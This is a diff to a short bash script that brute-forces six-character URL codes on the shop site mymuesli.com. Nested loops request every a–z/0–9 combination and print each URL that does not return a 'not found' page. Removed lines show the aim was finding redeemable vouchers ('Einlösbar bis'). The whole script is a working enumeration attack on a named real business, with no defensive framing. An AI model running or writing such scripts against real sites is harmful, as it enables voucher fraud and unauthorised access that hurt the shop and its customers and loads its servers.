@@ -1,11 +1,28 @@
 #!/bin/bash
-BASE_URL="https://mymuesli.com/"
-STRING_ALPHABET="abcdefghijklmnopqrstuvwxyz123456789"
-STRING_LENGTH="6"
-STRING="aaaaaa"
-for i in 1 2 ; do
-  curl ${BASE_URL}$STRING | grep "Einlösbar bis" && echo $output
+base_url="https://www.mymuesli.com/"
+string_alphabet=`echo {a..z} {0..9}`
+curl_options="--connect-timeout 1 --silent"
+grep_options="--quiet"
+for c1 in $string_alphabet; do
+for c2 in $string_alphabet; do
+for c3 in $string_alphabet; do
+for c4 in $string_alphabet; do
+for c5 in $string_alphabet; do
+for c6 in $string_alphabet; do
+  curl $curl_options ${base_url}$c1$c2$c3$c4$c5$c6 | rg $grep_options "Nicht gefunden"  
+  if [ ${PIPESTATUS[1]} -eq 1 ]; then
+    echo ${base_url}$c1$c2$c3$c4$c5$c6 
+  fi
 done
+done
+done
+done
+done
+done
+
+#for i in 1 2 ; do
+ # curl $CURL_OPTIONS ${BASE_URL}$STRING | rg "<title>"  
+#done
 
 
 incrementString()
